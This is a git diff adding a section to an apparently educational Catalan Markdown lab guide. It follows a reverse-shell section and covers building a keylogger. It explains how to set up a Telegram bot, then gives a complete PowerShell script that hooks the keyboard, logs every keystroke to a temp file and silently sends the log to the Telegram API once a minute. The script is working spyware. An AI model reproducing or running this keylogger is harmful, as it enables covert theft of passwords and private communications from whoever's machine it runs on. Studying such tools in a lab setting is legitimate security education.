@@ -389,3 +389,131 @@ Ara comprovem que la reverse shell funciona reiniciant l'ordinador. Haurem de te
 
 ### Apartat 2. Keylogger amb enviament de dades a bot de Telegram.
 
+<img width="800" height="624" alt="imatge" src="https://github.com/user-attachments/assets/15be4977-9f3f-49a5-8e23-6bb840e3ce9f" />
+
+Entrem a Telegram i busquem @BotFather. Iniciem un xat i escrivim _/newbot_
+
+<img width="486" height="483" alt="imatge" src="https://github.com/user-attachments/assets/bc7730d3-04ed-4c99-a52f-4b44aa9eb408" />
+
+Li donem nom al bot i li assignem un usuari. En el ultim missatge ens haurà otorgat un token (està censurat). L'haurem de guardar.
+
+<img width="514" height="620" alt="imatge" src="https://github.com/user-attachments/assets/a7c138b4-dfe6-45eb-99c5-3e861d8dd953" />
+
+Li enviem un missatge al nostre bot per poder rebre el chat id.
+
+<img width="427" height="906" alt="imatge" src="https://github.com/user-attachments/assets/d0065bb8-3cd6-40c0-8603-cc6ed65292bf" />
+
+Accedim a _https://api.telegram.org/bot<TOKEN>/getUpdates_ i veurem el json. Haurem de buscar el chat id. 
+
+<img width="947" height="696" alt="imatge" src="https://github.com/user-attachments/assets/c9b8c72d-9761-47eb-99f7-878636b8679d" />
+
+Creem el script següent i el guardem en format ps1.
+
+```bash
+
+$botToken = "TOKEN"
+$chatId   = "CHAT_ID"
+$logFile  = "$env:TEMP\klog.txt"
+$interval = 60   # segons entre enviaments
+
+# ---------- 1. DEFINICIÓ DEL GANXO DE TECLAT ----------
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.IO;
+using System.Windows.Forms;
+
+public class KeyHook {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
+
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    public static void Start() {
+        _hookID = SetHook(_proc);
+        Application.Run();   // bucle de missatges (necessari per rebre el ganxo)
+        UnhookWindowsHookEx(_hookID);
+    }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
+        using (var curModule = curProcess.MainModule) {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            Keys key = (Keys)vkCode;
+            string k = key.ToString();
+
+            // Traducció simple de tecles especials
+            if (k.Length == 1) {
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), k);
+            } else if (k == "Space") {
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), " ");
+            } else if (k == "Return") {
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), Environment.NewLine);
+            } else if (k == "Back") {
+                // No podem esborrar del fitxer fàcilment; ho marquem
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[BACK]");
+            } else {
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[" + k + "]");
+            }
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
+"@ -ReferencedAssemblies System.Windows.Forms
+
+# ---------- 2. INICIAR EL GANXO ----------
+# Executem el ganxo dins un Job perquè no bloquegi aquest fil
+Start-Job -ScriptBlock {
+    [KeyHook]::Start()
+} | Out-Null
+
+# ---------- 3. BUCLE D'ENVIAMENT A TELEGRAM ----------
+while ($true) {
+    Start-Sleep -Seconds $interval
+
+    if (Test-Path $logFile) {
+        $content = Get-Content $logFile -Raw
+        if ($content -and $content.Trim().Length -gt 0) {
+            try {
+                Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
+                    -Method Post `
+                    -Body @{ chat_id = $chatId; text = $content } | Out-Null
+                Clear-Content $logFile   # Buidar després d'enviar
+            } catch {
+                # Silenci: si falla l'enviament, no volem soroll
+            }
+        }
+    }
+}
+
+```
+
+<img width="605" height="469" alt="imatge" src="https://github.com/user-attachments/assets/562b495c-7e15-4ba4-901a-f717f4eda618" />
+
+Guardem l'arxiu ps1.
+
